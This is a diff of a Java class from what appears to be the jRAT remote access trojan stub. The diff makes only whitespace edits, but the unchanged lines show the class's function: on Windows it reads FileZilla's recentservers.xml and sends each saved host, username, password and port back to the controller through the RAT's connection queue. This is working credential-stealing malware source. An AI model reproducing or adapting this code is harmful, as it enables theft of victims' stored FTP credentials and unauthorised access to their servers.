@@ -15,8 +15,6 @@ import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet48FileZillaPassword;
 import pro.jrat.stub.utils.Utils;
 
-
-
 public class Packet68FileZillaPassword extends AbstractIncomingPacket {
 
 	@Override
@@ -24,7 +22,7 @@ public class Packet68FileZillaPassword extends AbstractIncomingPacket {
 		File file = null;
 		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 			file = new File(System.getenv("APPDATA") + "\\FileZilla\\recentservers.xml");
-			
+
 			if (file.exists()) {
 				DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
 				DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
@@ -36,13 +34,13 @@ public class Packet68FileZillaPassword extends AbstractIncomingPacket {
 					Node nNode = nList.item(temp);
 					if (nNode.getNodeType() == Node.ELEMENT_NODE) {
 						Element eElement = (Element) nNode;
-						
+
 						Connection.addToSendQueue(new Packet48FileZillaPassword(Utils.getTagValue("Host", eElement), Utils.getTagValue("User", eElement), Utils.getTagValue("Pass", eElement), Utils.getTagValue("Port", eElement)));
 					}
 				}
 			}
-		}		
-		
+		}
+
 	}
 
 }
